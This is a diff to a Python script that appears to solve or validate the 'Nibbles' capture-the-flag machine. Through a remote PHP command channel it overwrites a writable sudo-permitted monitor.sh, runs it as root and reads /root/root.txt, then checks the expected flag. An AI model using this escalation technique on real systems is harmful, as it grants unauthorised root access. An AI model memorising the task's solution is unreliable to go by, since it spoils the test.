@@ -3,6 +3,7 @@
 import base64
 import http.cookiejar
 import os
+import shlex
 import socket
 import urllib.parse
 import urllib.request
@@ -113,23 +114,25 @@ output = run_php(
 )
 assert "monitor.sh" in output and "NOPASSWD" in output, output
 
-root_script = (
-    "#!/bin/sh\n"
-    "id > /tmp/nibbles-native-root-proof\n"
-    "cat /root/root.txt > /tmp/nibbles-native-root-answer\n"
-    "chmod 0644 /tmp/nibbles-native-root-answer\n"
-)
-encoded = base64.b64encode(root_script.encode()).decode()
+script_lines = [
+    "#!/bin/sh",
+    "id > /tmp/nibbles-native-root-proof",
+    "cat /root/root.txt > /tmp/nibbles-native-root-answer",
+    "chmod 0644 /tmp/nibbles-native-root-answer",
+]
+quoted_lines = " ".join(shlex.quote(line) for line in script_lines)
 command = (
-    f"printf '%s' '{encoded}' | base64 -d > "
-    "/home/nibbler/personal/stuff/monitor.sh && "
+    "printf '%s\\n' " + quoted_lines +
+    " > /home/nibbler/personal/stuff/monitor.sh && "
     "chmod 0755 /home/nibbler/personal/stuff/monitor.sh && "
-    "sudo -n /home/nibbler/personal/stuff/monitor.sh && "
-    "cat /tmp/nibbles-native-root-proof && "
-    "cat /tmp/nibbles-native-root-answer"
+    "echo BEFORE_SUDO && "
+    "sudo -n /home/nibbler/personal/stuff/monitor.sh 2>&1; "
+    "echo SUDO_STATUS:$?; "
+    "echo ROOT_PROOF; cat /tmp/nibbles-native-root-proof 2>&1; "
+    "echo ROOT_ANSWER; cat /tmp/nibbles-native-root-answer 2>&1"
 )
 root_output = run_php(command)
 assert "uid=0(root)" in root_output, root_output
-root_flag = root_output.strip().splitlines()[-1]
+root_flag = root_output.split("ROOT_ANSWER", 1)[1].strip().splitlines()[-1]
 assert root_flag == EXPECTED_ROOT_FLAG, "Exact per-instance Root Flag mismatch"
 print("PASS: writable sudo monitor script executes as UID 0 and retrieves exact Root Flag", flush=True)
